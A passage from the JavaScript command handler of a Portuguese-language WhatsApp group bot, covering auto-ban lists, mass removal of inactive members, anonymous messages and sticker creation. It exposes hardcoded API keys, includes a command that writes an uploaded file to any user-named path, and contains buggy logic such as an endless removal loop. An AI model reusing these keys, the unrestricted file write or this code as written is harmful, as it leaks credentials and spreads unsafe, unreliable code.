if(isAdeusCara) {
adeuscara[ind].actived = false
} else {
adeuscara.push({
groupId: from,
actived: false,
number: []
})
}
fs.writeFileSync('./fun√ß√µes de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`Desativou com sucesso o recurso de autoban neste grupo‚úîÔ∏è`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'listban':
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum N√∫mero n√£o foi adicionado*')
teks = '*N√∫meros que vou moer na porrada se voltar üò°:*\n'
for(i=0;i<adeuscara[ind].number.length;++i) {
teks += `‚û§ *${adeuscara[ind].number[i]}*\n`
}
teks += '*Esses ai vou descer meu martelo do ban ü•µ*'
reply(teks)
break  


case 'listagp':
try {
if (!SoDono) return reply(enviar.msg.donosmt)
let getGroups = await pl.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
if(q.includes("-l") || q.includes("--list")) {
array_gps = [];
for(let a of groups) {
try {
array_gps.push({
title: `‚Äçùó°ùóºùó∫ùó≤: ${a.subject}`,
description: `ùóúùó±: ${a.id}\nùó†ùó≤ùó∫ùóØùóøùóºùòÄ: ${a.participants.length}`,
rowId: `${prefix + command} ${a.id}`
})
} catch {}
}
buttonmessage02 = {
title: `Lista de grupos`,
text: `Selecione um grupo para mais detalhes`,
buttonText: "Selecionar",
sections: [
            {
                rows: array_gps
            }
           ]
}
pl.sendMessage(from, buttonmessage02, {quoted: info})
} else if (q && args[0].endsWith("g.us")) {
try {
let infogp = await pl.groupMetadata(`${args[0]}`)
try {
ppUrl = await pl.profilePictureUrl(`${args[0]}`, 'image')
} catch { ppUrl = "https://telegra.ph/file/41634a68c48c40189dbf7.jpg" }
try {
linkgc = await pl.groupInviteCode(infogp.id)
linkgp = 'https://chat.whatsapp.com/'+linkgc
} catch { linkgp = "Bot n√£o √© admin" }
txt = 
`ùó°ùóºùó∫ùó≤ ùó±ùóº ùó¥ùóøùòÇùóΩùóº: ${infogp.subject}
ùóóùóºùóªùóº: ${infogp.owner ? infogp.owner : "N√£o tem"}
ùó†ùó≤ùó∫ùóØùóøùóºùòÄ: ${infogp.participants.length}
ùóúùó±: ${infogp.id}
ùóüùó∂ùóªùó∏: ${linkgp}
`
await pl.sendMessage(from, {image: {url: ppUrl}, caption: txt, thumbnail: null, mentions: [sender]}, {quoted: selo})
} catch {}
} else {
txt = "‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n"
array_owners = [];
for(let a of groups) {
txt += `ùó°ùóºùó∫ùó≤ ùó±ùóº ùó¥ùóøùòÇùóΩùóº: ${a.subject}
ùóóùóºùóªùóº / ùó∞ùóøùó∂ùóÆùó±ùóºùóø: @${a.owner ? a.owner.split("@")[0] : "N√£o tem"}
ùó†ùó≤ùó∫ùóØùóøùóºùòÄ: ${a.participants.length}
ùóúùó±: ${a.id}\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\n
`
if(a.owner !== undefined) {
array_owners.push(`${a.owner}`)
}
}
pl.sendMessage(from, {text: txt, mentions: array_owners})
}
} catch {
reply("Hmm deu erro")
}
break

case 'blockcmd':
if(!SoDono  && !isnit) return reply(enviar.msg.donosmt)
tp = args.join(" ")
if(tp.includes("blockcmd blockcmd") || (tp.includes("blockcmd  blockcmd"))) return reply(`T√° louco maluco?, Quer banir o comando de bloquear comando?`)
if(getComandoBlock(from).includes(args[0]))return reply('Este comando j√° est√° blockeado')
addComandos(from, args[0])
reply(`O comando ${args[0]} Foi blockeado`)
break

case 'unblockcmd':
if(!SoDono  && !isnit) return reply(enviar.msg.donosmt)
tp = args.join(" ")
if(tp.includes("blockcmd unblockcmd") || (tp.includes("blockcmd  unblockcmd"))) return reply(`T√° louco maluco?, Quer banir o comando de desbloquear comando?`)  
if(!getComandoBlock(from).includes(args[0]))return reply('Este comando j√° est√°  desbloqueado')
deleteComandos(from, args[0])
reply(`O comando ${args[0]} Foi desblockeado`)
break

case 'listacomandos':
tkks = '‚ï≠‚îÄ*„Äå *COMANDOS BLOCK* „Äç\n'
for (let V of getComandoBlock(from)) {
tkks += `‚îÇ+  ${V}\n`
}
tkks += `‚îÇ+ Total : ${getComandoBlock(from).length}\n‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ*„Äå *${NomeDoBot}* „Äç*‚îÄ‚îÄ‚îÄ‚îÄ`
await pl.sendMessage(from, tkks.trim(), extendedText, {quoted: selo})
break

case 'b':
case 'addautorm':
case 'addautoban':
case 'listanegra':  
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Cade o n√∫mero?')
var ind = dbids.indexOf(from)
if(isAdeusCara) {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")  
var numind = adeuscara[ind].number.indexOf(listng)
if(numind >= 0) return reply('*Esse N√∫mero ja esta incluso*')
adeuscara[ind].number.push(listng)
} else {
listng = q.replace(new RegExp("[()+-/ +/]", "gi"), "")    
adeuscara.push({
groupId: from,
actived: false,
number: [listng]
})
}
fs.writeFileSync('./fun√ß√µes de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*N√∫mero adicionado a lista de autoban*`)
break

case 'delremover':
case 'delautorm':  
case 'delautoban': 
case 'tirardalista':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins && !SoDono) return reply('Precisa ser Dono')
if (args.length < 1) return reply('Diga o numero sem espa√ßo, + ou tra√ßo')
if (isNaN(args[0])) return reply('Diga o numero sem espa√ßo, + ou tra√ßo')
var ind = dbids.indexOf(from)
if(!isAdeusCara) return reply('*Nenhum N√∫mero n√£o foi adicionado*')
var numind = adeuscara[ind].number.indexOf(args[0])
if(numind < 0) return reply('*Esse n√∫mero n√£o est√° incluso*')
adeuscara[ind].number.splice(numind, 1)
fs.writeFileSync('./fun√ß√µes de cmd/grupos/adeuscara.json', JSON.stringify(adeuscara, null, 2) + '\n')
reply(`*N√∫mero removido a lista de autoban*`)
break

case 'banghost':
case 'banghosts':  
if(!isGroup) return reply(enviar.msg.grupo)  
if(!SoDono) return reply("S√≥ dono pode executar este comando..")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta fun√ß√£o.')
if(q.length < 1) return reply(`Exemplo: ${prefix}banghosts 0\n\nEle vai banir todos aqueles que t√° com 0 mensagens, mas fa√ßa isso apenas se passou um tempo com o bot armazenando mensagem dos membros ativos do grupo.`)
async function banghst() {
if(groupIdscount.indexOf(from) >= 0) {
for(let obj of groupMembers) {
if(numbersIds.indexOf(obj.id) >=0) { 
var indnum = numbersIds.indexOf(obj.id)
if(countMessage[ind].numbers[indnum].messages <= args[0]) {
if(groupAdmins.includes(obj.id)) return mentions(`@${obj.id} ta liberado da inspe√ß√£o por ser admin`, [obj.id], true)
if(numerodono.includes(obj.id)) return mentions(`@${obj.id} ta liberado da inspe√ß√£o por ser dono`, [obj.id], true)
pl.groupParticipantsUpdate(from, [obj.id], 'remove')
}
}
}
}
}
setInterval(banghst, 1000)
break

case 'convite':
if(!budy.includes("chat.whatsapp.com")) return reply("Cad√™ o link do grupo que voc√™ deseja que eu entre?")
cnvt = args.join(" ")
reply(`O convite para o bot entrar em seu grupo, foi enviado, espere o dono aceitar..`)
sendBtext(`${numerodonoa}@s.whatsapp.net`,`üí´ Convite para entrar em um Grupo\n\nLink : ${cnvt}\n\nN√∫mero dele(a) : wa.me/${sender.split("@")[0]}`, `${NomeDoBot}Ô∏è`, [
{buttonId: `${prefix}entrar ${cnvt}`, buttonText: {displayText: `Aceitar`}, type: 1},
{buttonId: `${prefix}recusar ${sender}`, buttonText: {displayText: `Recusar`}, type: 1}], selo)
break

case 'recusar':
if(!SoDono) return reply("S√≥ dono...")
pl.sendMessage(q, {text: `Ol√° Amigo(a), sinto muito dizer, mas seu convite foi recusado ü•∫`})
break

case 'join':
case 'entrar':
if (!SoDono) return reply(enviar.msg.donosmt)
if (!q) return reply('Coloque o link')
if (!isUrl(args[0]) || !args[0].includes('whatsapp.com')) return reply("Link inv√°lido")
try {
let result = args[0].split('chat.whatsapp.com/')[1]
await pl.groupAcceptInvite(result)
reply('Prontinho, fiz o que voc√™ pediu')
} catch(erro) {
if(String(erro).includes("resource-limit")) {
reply("O bot n√£o pode entrar nesse grupo porque ele est√° lotado")
} else if(String(erro).includes("not-authorized")) {
reply("O bot n√£o pode entrar nesse grupo porque ele foi removido")
} else if(String(erro).includes("gone")){
reply("O bot n√£o pode entrar nesse grupo porque o link foi redefinido")
} else if(String(erro).includes("not-acceptable")) {
reply("Esse grupo n√£o existe")
} else {
reply("Hmm n√£o consegui entrar no grupo")
}
}
break

case 'correio':
{
txt = args.join(" ")
if(!txt) return reply(`Exemplo: ${prefix + command} +55 00.../Oi amor, sdds`)
let txt1 = txt.split("/")[0].replace(/\D/g,'');
let txt2 = txt.split("/")[1];
if(!txt1) return reply('Cade o n√∫mero da pessoa?')
if(!txt2) return reply('Cade a mensagem do correio??')
let [result] = await pl.onWhatsApp(txt1)
if(!result) return reply(`N√∫mero inv√°lido`)
bla = 
`‚ï≠‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚ïÆ
‚îû‚îß¬†‚∏ô. Õé€´€™¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†üíå¬†¬†ÀêÕ°‚ÇäÍûãÍûåÍûãÍûå
‚îû‚îßCorreio an√¥nimo. 
‚îû‚îßMsg: ${txt2}
‚îû‚îß
‚ï∞‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚îÑ‚îÅ‚ïÆ`
pl.sendMessage(result.jid, {text: bla})
reply(`Mensagem enviada com sucesso para wa.me/${result.jid.split("@")[0]}`)
}
break

//==========SUBSTITUI√á√ïES============\\

case 'enviarindex': case 'enviar-index':
if (!SoDono  && !info.key.fromMe) return reply(enviar.msg.donosmt)  
bla = fs.readFileSync(`./index.js`)
pl.sendMessage(sender, {document: bla, mimetype: 'document/js', fileName: `index.js`})
break

case 'enviarindex2': case 'enviar-index2':
if (!SoDono  && !info.key.fromMe) return reply(enviar.msg.donosmt)  
bla = fs.readFileSync(`./akame kill.js`)
pl.sendMessage(sender, {document: bla, mimetype: 'document/js', fileName: `akame kill.js`})
break

case 'substituir':
if(!SoDono && !isnit) return reply("Apenas meu mestre.")
 if (isMedia && !info.message.videoMessage || isQuotedDocument) {
media = isQuotedDocument ? info.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : info.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(q, doc)
pl.sendMessage(from, {text:'Substituido com sucesso..'},{quoted: selo})
} else {
reply('nao deu')
}
break

case 'inativos':  
if (!isGroup) return reply(enviar.msg.grupo)
if(groupIdscount.indexOf(from) < 0) return reply('O bot n√£o tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if(countMessage[ind].numbers.length < 3) return reply('Necessita do registro de 3 usuarios')
if(countMessage[ind].numbers[indnum].messages == 2570) {
countMessage[ind].numbers.sort((a, b) => (a.messages < b.messages) ? -1 : -1)
mentioned_jid = []
boardi = 'üî•·çù‚Éü¬†¬†¬† Ranking dos membros mais inativos do grupo :\n\n'
try {
for (let i = 0; i < groupMembers.length; i++) {
if (i) boardi += `${i}¬∫ ü•á : @${countMessage[ind].numbers[i].id.split('@')[0]}\nMensagens: ${countMessage[ind].numbers[i].messages}\nComandos dados: ${countMessage[ind].numbers[i].cmd_messages}\n\n`
mentioned_jid.push(countMessage[ind].numbers[i].id)
} 
mentions(boardi, mentioned_jid, true)
} catch (err) {
console.log(err)
pl.sendMessage(from, {text: boardi}, {quoted: info})
}
}
break

case 'rankinativo':
case 'rankinativos':  
var ind = groupIdscount.indexOf(from)
if(countMessage[ind].numbers.length < 6) return reply('Necessita do registro de 6 usuarios')
bule = [];
bule2 = []
mentioned_jid = []
groupMembers2 = []
for (a of groupMembers)groupMembers2.push(a.id)
for(cag of countMessage[ind].numbers){
bule2.push(cag.id)
if(groupMembers2.includes(cag.id)){
if(cag.messages <= 1){bule.push(cag)}}}
bule.sort((a, b) => ((a.messages + a.cmd_messages) < (b.cmd_messages + b.messages)) ? 0 : -1)
boardi = 'Rank dos mais Ghosts do Grupo:\n\n'
if(bule.length == 0)boardi += 'Sem Ghosts'
for (let i = 0 ; i < bule.length; i++) {
if (i != null) boardi += `${i + 1}¬∫ : @${bule[i].id.split('@')[0]}\nMensagens: ${bule[i].messages}\nComandos dados: ${bule[i].cmd_messages}\n\n`
mentioned_jid.push(bule[i].id)
} 
mentions(boardi, mentioned_jid, true)
break

case 'checkativo':
if (!isGroup) return reply(enviar.msg.grupo)
if(groupIdscount.indexOf(from) < 0) return reply('O bot n√£o tem ainda dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque o n√∫mero que deseja puxar a atividade')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(numbersIds.indexOf(mentioned[0]) >= 0) {
var indnum = numbersIds.indexOf(mentioned[0])
mentions(`ñ£ò‚Éü·óí Consulta das atividade de\nñ£ò‚Éü·óí @${mentioned[0].split('@')[0]} no grupo\nñ£ò‚Éü·óí Mensagens: ${countMessage[ind].numbers[indnum].messages}\nñ£ò‚Éü·óí Comandos dados: ${countMessage[ind].numbers[indnum].cmd_messages}`, mentioned, true)
} else {
mentions(`‚ãÜ‚Éü€ú€£·≠™‚û£ Consulta da atividade de ‚ãÜ‚Éü€ú€£·≠™‚û£ @${mentioned[0].split('@')[0]} no grupo\n‚ãÜ‚Éü€ú€£·≠™‚û£ Mensagens: 0\n‚ãÜ‚Éü€ú€£·≠™‚û£ Comandos dados: 0`, mentioned, true)
}
break

case 'sorteionumero':
case 'sorteionumeros':  {
if(!isGroupAdmins) return reply('S√≥ ADM pode utilizar este comando.')  
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, ap√≥s o comando sorteio, por exemplo, ${prefix}sorteionumero de 100 R$`)
var numerossrt = sortear[Math.floor(Math.random() * sortear.length)] 
d = []
guxxt =  `üéâParab√©ns ao n√∫mero do sortudo, por ganhar o sorteio ${q}:\n\n`
for(i = 0; i < 1; i++) {
guxxt += `üî•·çù‚Éü¬†¬†‚û£ ${numerossrt}\n`
d.push(numerossrt)
}
mentions(guxxt, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
}
break

case 'sorteio': {
if(!isGroupAdmins) return reply('S√≥ ADM pode utilizar este comando.')
try{
if(!isGroup) return reply(enviar.msg.grupo)
if(!q) return reply(`Coloque algo, ap√≥s o comando sorteio, por exemplo, ${prefix}sorteio de 100 R$`)
d = []
guxxt = `üéâParab√©ns, por ganhar o sorteio ${q}:\n\n`
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
guxtt += `üî•·çù‚Éü¬†¬†‚û£ @${groupMembers[r].id.split('@')[0]}\n`
d.push(groupMembers[r].id)
}
mentions(guxxt, d, true)
} catch (e) {
console.log(e)
reply('Deu erro, tente novamente :/')
}
}
break

case 'desban':
if(!isPremium) return reply(enviar.msg.premium)
if(!budy.includes("/")) return m.reply(`Exemplo: ${prefix}desbanir N√∫mero banido injustamente/Meu n√∫mero +55 79 xxxx-xxxx foi banido injustamente desbana por favor`)
var [qsp, qsp2] = q.split("/")
await fetchJson(`https://rafinha043.herokuapp.com/enviar/email?titulo=${qsp}&texto=${qsp2}&apikey=KgIbfyAJ`)
m.reply(`Ol√° ${pushname} A mensagem foi enviada para o suporte com sucesso s√≥ aguardar...`) 
break

case 'desban2':
if(!isPremium) return reply(enviar.msg.premium)
if(!budy.includes("/")) return m.reply(`Exemplo: ${prefix}desbanir N√∫mero banido injustamente/Meu n√∫mero +55 79 xxxx-xxxx foi banido injustamente desbana por favor`)
var [qsp, qsp2] = q.split("/")
await fetchJson(`https://rafinha043.herokuapp.com/enviar/email?titulo=${qsp}&texto=${qsp2}&apikey=qzFGCJv3`)
reply(`Ol√° ${pushname} A mensagem foi enviada para o suporte com sucesso s√≥ aguardar...`) 
break

//==============LEGENDAS=============

case 'legendabv2':  
if(!isGroup) return reply('Este comando s√≥ deve ser utilizado em Grupo.')
if(!isGroupAdmins) return reply(`S√≥ ADM pode utilizar este comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
tekokk = body.slice(12)
if(isWelcomed2) {
var ind = groupIdWelcomed2.indexOf(from)
welcome_group2[ind].msg = tekokk
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: tekokk
}
welcome_group2.push(json)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/welcomegp2.json', JSON.stringify(welcome_group2, null, 2) + '\n')
reply('*Mensagem de boas vindas2 criada com sucesso!*')
}
break

case 'legendasaiu2':
if(!isGroup) return reply(`S√≥ em grupo pode utilizar este comando.`)
if(!isGroupAdmins) return reply(`S√≥ ADM pode utilizar este tipo de Comando.`)
if(args.length < 1) return reply('*Escreva a mensagem de sa√≠da*')
teskk = body.slice(14)
if(isByed2) {
var ind = groupIdBye.indexOf(from)
bye_group2[ind].msg = teskk
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de sa√≠da2 alteradas com sucesso!*')
} else {
var json = {
id: from,
msg: teskk
}
bye_group2.push(json)
fs.writeFileSync('./fun√ß√µes de cmd/fun√ß√µes/byegp2.json', JSON.stringify(bye_group2, null, 2) + '\n')
reply('*Mensagem de sa√≠da2 criada com sucesso!*')
}
break


case 'legenda2': {
    if (!/image/.test(mime)) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} texto1|text2`)
if (!text) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} texto1|text2`)
    pl.sendMessage(from, { react: { text: `üëã`, key: info.key }})      
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
//res = await upload(owgi)
    let dwnld = await quoted.download()
    let { floNime } = require('./fun√ß√µes/uploader')
    let fatGans = await floNime(dwnld)
    let smeme = `https://api.memegen.link/images/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}/${fatGans.url}.png`
    let FaTiH = await pl.sendImageAsSticker(from, smeme, m, { packname: global.packname, author: global.auhor })
    await fs.unlinkSync(FaTiH)
}
   break
  
case 'legenda': {
    if (!/image/.test(mime)) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} |text2`)
if (!text) return reply( `Enviar/responder imagem/adesivo com legenda ${prefix + command} |text2`)
    pl.sendMessage(from, { react: { text: `üëã`, key: info.key }})      
    atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    let dwnld = await quoted.download()
    let { floNime } = require('./fun√ß√µes/uploader')
    let fatGans = await floNime(dwnld)
    let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
    let FaTiH = await pl.sendImageAsSticker(from, smeme, m, { packname: global.packname, author: global.auhor })
    await fs.unlinkSync(FaTiH)
}
   break




case 'g':
if (!q) return reply('E o texto?')
var kls = q
var pack = kls.split("/")[0];
var author2 = kls.split("/")[1];
cg = await getBuffer(`https://api.memegen.link/images/aag/${pack}/${author2}.png`)
pl.sendMessage(from, {image: cg})
break
   
//========FINAL DAS LEGENDAS=============
   

//=============STICKER============
   

case 'figfundo':
case 'figvideo':
case 'figusemfundo': 
case 'sfundo':  
if(!isQuotedImage) return reply(`Marque uma imagem`)
if ((isMedia && !info.message.videoMessage || isQuotedImage) && args.length == 0) {
manu = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
reply(enviar.espere)
buff = await getFileBuffer(manu, 'image')
bas64 = `data:image/jpeg;base64,${buff.toString('base64')}`
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `${pushname}`
sd = `üìçCriado por‚Üì${NomeDoBot}`
dua = typeof anu[1] !== 'undefined' ? anu[1] : `${sd}`
var mantap = await convertSticker(bas64, `${dua}`, `${satu}`)
var sti = new Buffer.from(mantap, 'base64');
pl.sendMessage(from, {sticker: sti}, {quoted: selo})
} else {
return reply(`So imagem mn -_-`)
}
break

case 'sc':
case 'c':
case 'csticker':
case 'cstiker':
case 'stcirculo':
case 'circlesticker':
try {
if ((isMedia && info.message.imageMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
media = rane
getpunt = getRandom('.png')
inpunt = getRandom('.webp')
exec(`convert -size 200x200 xc:none -fill ${media} -draw "circle 100,100 100,1" ${getpunt} && magick ${getpunt} -quality 50 -define webp:lossless=true ${inpunt}`, async (error) => {
if (error) console.log(error)
await pl.sendMessage(from, {sticker: fs.readFileSync(inpunt)}, {quoted: info})
if (fs.existsSync(inpunt)) fs.unlinkSync(inpunt)
if (fs.existsSync(media)) fs.unlinkSync(media)
if (fs.existsSync(getpunt)) fs.unlinkSync(getpunt)
if (fs.existsSync(rane)) fs.unlinkSync(rane)
})
} else {
reply("Apenas imagens")
}
} catch (e) {
console.log(e)
reply("Error")
}
break


case 'sticker': 
case 's': 
case 'stickergif': 
case 'sgif': 
case 'f': 
case 'figu': 
case 'st': 
case 'stk': 
{
(async function () {
var legenda = q ? q?.split("/")[0] : `[ü©∏] ùêÇùê´ùê¢ùêöùêùùê®ùê´ ùêùùêö ùêüùê¢ùê†:
[ü©∏] ùêÅùê®ùê≠:
[ü©∏] ùêÉùê®ùêßùê®:
[ü©∏] ùêçùê¢ùêúùê§ ùêùùê® ùêùùê®ùêßùê®:`
var autor = q ? q?.split("/")[1] : q?.split("/")[0] ? '' : `{ ${pushname}
{ ${NomeDoBot}
{ ${numerodonoa}
{ ${NickDono}`
if (isMedia && !info.message.videoMessage || isQuotedImage) {
var encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(rane)
// "android-app-store-link": "https://play.google.com/store/search?q=%2B55%2094%209147-2796%20%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5&c=apps",
var json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
var exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
var jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
var exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = Math.floor(Math.random() * (99999 - 11111 + 1) + 11111)+".temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
pl.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: selo})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else if (isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 35) {
var encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
await ffmpeg(`./${rane}`)
.inputFormat(rane.split('.')[1])
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(rane)
let json = {
"sticker-pack-name": legenda,
"sticker-pack-publisher": autor
}
let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
let jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
let exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = "temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
pl.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: selo})
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else {
reply(`Voc√™ precisa enviar ou marcar uma imagem ou v√≠deo com no m√°ximo 10 segundos`)
}
})().catch(e => {
console.log(e)
reply("Hmm deu erro")
try {
if (fs.existsSync("temp.exif")) fs.unlinkSync("temp.exif");
if (fs.existsSync(rano)) fs.unlinkSync(rano);
if (fs.existsSync(media)) fs.unlinkSync(media);
} catch {}
})
}
break
   
   
   
case 'f':   
case 'f': {

if (/image/.test(mime)) {
media = await quoted.download()
let encmedia = await pl.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.packname2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 40) return reply('M√°ximo 40 segundo!')
media = await quoted.download()
let encmedia = await pl.sendVideoAsSticker(from, media, m,  { packname: global.packname, author: global.packname2 })
await fs.unlinkSync(encmedia)
} else {
reply(`Enviar imagem/v√≠deo com legenda ${prefix + command}\nDura√ß√£o Video 1/40 segundo`)
}
}
break


case 'emoji': {
if (!args.join(" ")) return reply('CAD√ä O EMOJI?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await pl.sendMessage(from, {image:{url:emoji.images[4].url}, caption:"PRONTO!"}, {quoted:m})
await pl.sendMessage(from, {text:`!s`}, {quoted:mese})
}).catch(e => {
reply("EMOJI N√ÉO ENCONTRADO, TENTE OUTRO EMOJI A√ç...")
})
}
break


case 'emoji2':     
case 'emoji-mix':
case 'emojimix': {
    if (!q) return reply( `Exemplo : ${prefix + command} üòÖ+ü§î`) 
	reply('SER N√ÉO FOR TENTA COM OUTRO... ?')
			let [emoji1, emoji2] = q.split`+`
		 anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
	let encmedia = await pl.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
	await fs.unlinkSync(encmedia)
		}
}
break

case 'rename':
case 'roubar':  
if (!isQuotedSticker) return reply('Marque uma figurinha...')
encmediats = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
var kls = q
var pack = kls.split("/")[0];
var author2 = kls.split("/")[1];
if (!q) return reply('*E o autor e o nome do pacote?*')
if (!pack) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/bla*`)
if (!author2) return reply(`*por favor escreve o formato certo: ${prefix + command} sad/dms*`)
reply(enviar.espere)
bas64 = `data:image/jpeg;base64,${encmediats.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var sti = new Buffer.from(mantap, 'base64');
pl.sendMessage(from, {sticker: sti, contextInfo: { externalAdReply:{title: `${pack}|${author2}`,body:"", previewType:"PHOTO",thumbnail: sti}}}, {quoted: selo})
.catch((err) => {
reply(`‚ùé Error, tenta mais tarde`); 
})
break

case 'togif':
if (!isQuotedSticker) return reply('*[ ‚ùó ] Marque a figurinha animada!*')
if ((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
buff = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
reply('*„Äå ‚ùó „Äç Aguarde, convertendo a figu em gif...*')
a = await webp_mp4(buff)
mp4 = await getBuffer(a)
pl.sendMessage(from, {video: mp4, gifPlayback: true, filename: `stick.gif`}, {quoted: selo})
fs.unlinkSync(buff)
}
break

case 'toimg':
if (!isQuotedSticker) return reply('‚ùå adesivo de resposta um ‚ùå')
reply(enviar.espere)
buff = await getFileBuffer(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
